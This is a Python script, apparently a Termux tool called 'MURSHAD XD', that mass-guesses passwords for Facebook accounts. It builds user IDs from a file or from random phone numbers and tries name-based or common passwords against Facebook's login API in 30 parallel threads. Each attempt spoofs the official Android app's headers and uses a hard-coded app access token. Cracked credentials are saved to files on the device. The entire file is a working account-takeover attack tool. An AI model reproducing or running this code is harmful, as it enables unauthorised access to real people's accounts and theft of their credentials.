samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H']
from os import path
import os,base64,zlib,pip,urllib
import time
os.system('clear')
print(' \033[1;37\33[1mChecking updates...\n');time.sleep(1.5)
try:
		import os,requests,json,time,re,random,sys,uuid,string,subprocess
		from string import *
		from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
		print('\n Installing missing modules ...')
		os.system('pip install requests futures==2 > /dev/null')
		os.system('python MURSHAD.py')
except:pass
oks,cps,pcp,loop=[],[],[],0
logo=('''\033[1;37m

8b    d8 88   88 88""Yb .dP"Y8 88  88    db    8888b.  
88b  d88 88   88 88__dP `Ybo." 88  88   dPYb    8I  Yb 
88YbdP88 Y8   8P 88"Yb  o.`Y8b 888888  dP__Yb   8I  dY 
88 YY 88 `YbodP' 88  Yb 8bodP' 88  88 dP""""Yb 8888Y"  

------------------------------------------------
 Author     :   Murshad Xd
 Facebook   :   Murshad Xd
 Status     :   Free
 Version    :   1.1
------------------------------------------------''')
def clear():
	os.system('clear')
	print(logo)
def linex():
	print('\033[1;37m------------------------------------------------')
def apv():
	clear()
	pass
def Menu():
	clear()
	print('\033[1;37m [1] File Cloning \n [2] Random Cloning \n [3] Contact us \n [0] Exit Menu ')
	x = input('\n Choice an option: ')
	if x =='1':
		file()
	elif x =='2':
		rnd()
	elif x =='3':
		os.system('xdg-open ');Menu
	elif x =='0':
		exit(' Thanks For Using our tool ')
	else:
		print('\033[1;37m [+] Select valid option\033[1;37m ');time.sleep(2.4)
		Menu()
def file():
	clear()
	file = input(' [•] Put file path\033[1;32m: ')
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print('\033[1;37m [+] File location not found ')
		time.sleep(1)
		file()
	clear()
	plist=[]
	try:
		ps_limit = int(input(' How Many Pasword You Want To Add :  '))
	except:
		ps_limit =1
	linex()
	print('\033[1;37m Example :\033[1;32mfirst last, firtslast, first123')
	linex()
	for i in range(ps_limit):
		plist.append(input(f'\033[1;37m [•] Put Password No.{i+1}: '))
	with tred(max_workers=30) as khan:
		clear()
		tl = str(len(fo))
		print(' Total accounts : \033[1;32m'+tl)
		print('\033[1;37m Process Has Been Started ... ')
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			khan.submit(api,ids,names,passlist)
	print('\033[1;37m')
	linex()
	print(' [*] The process has completed')
	print(' [*] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input('\033[1;32m [*] Press enter to back \033[1;37m')
	os.system('python MURSHAD.py')
def rnd():
	user=[]
	clear()
	print('\033[1;37m [•] Code example : \33[1;32m\33[1m0310,0315,0349,0334,0345\033[1;37m')
	linex()
	code = input('\033[1;37m [•] Put Code: ')
	try:
		limit = int(input('\033[1;37m [•] put limit: '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with tred(max_workers=30) as khan:
		clear()
		tl = str(len(user))
		print(' Total accounts : \033[1;32m'+tl)
		print(f'\033[1;37m Selected code  :\033[1;32m '+code)
		print(f'\033[1;37m Process running in the background\033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','khankhan123','baloch']
			khan.submit(rd,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [*] The process has completed')
	print(' [*] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input('\033[1;32m [*] Press enter to back \033[1;37m')
	os.system('python MURSHAD.py')
def api(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [MURSHAD-XD]  %s|\033[1;37m  OK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(000000000,999999999))
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(000000000,999999999))
			fbrv = str(random.randint(000000000,999999999))
			fbsv = str(random.randint(4,13))+'.0'
			model,build = random.choice(samsung).split('|')
			fbmf = 'samsung'
			fbbd = 'samsung'
			ua = 'Davik/2.1.0 (Linux; U; Android '+str(random.randint(4,13))+'.0; '+model+' Build/'+build+') [FBAN/FB4A;FBAV/'+fbav+';FBPN/com.facebook.katana;FBLC/en_GB;FBBV/'+fbbv+';FBCR/null;FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+fbsv+';FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/'+fbrv+';]'
			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			po = requests.post("https://graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true",data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [MURSHAD-OK] '+uid+' | '+pas)
				open('/sdcard/MURSHAD-OK.txt','a').write(uid+'|'+pas+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\33[1m\33[1;35m [MURSHAD-CP] '+uid+' | '+pas+'\033[1;97m')
				open(f'/sdcard/MURSHAD-CP.txt', 'a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
def rd(ids,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write(f'\r\r\033[1;37m [MURSHAD-XD]  %s|\033[1;37m  OK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(000000000,999999999))
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(000000000,999999999))
			fbrv = str(random.randint(000000000,999999999))
			fbsv = str(random.randint(4,13))+'.0'
			model,build = random.choice(samsung).split('|')
			fbmf = 'samsung'
			fbbd = 'samsung'
			ua = 'Davik/2.1.0 (Linux; U; Android '+str(random.randint(4,13))+'.0; '+model+' Build/'+build+') [FBAN/FB4A;FBAV/'+fbav+';FBPN/com.facebook.katana;FBLC/en_GB;FBBV/'+fbbv+';FBCR/null;FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+fbsv+';FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/'+fbrv+';]'
			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			po = requests.post("https://graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true",data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [MURSHAD-OK] '+uid+' | '+pas)
				open('/sdcard/MURSHAD-R-OK.txt','a').write(uid+'|'+pas+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\33[1m\33[1;35m [MURSHAD-CP] '+uid+' | '+pas+'\033[1;97m')
				open(f'/sdcard/MURSHAD-CP.txt', 'a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		print(e)
Menu()
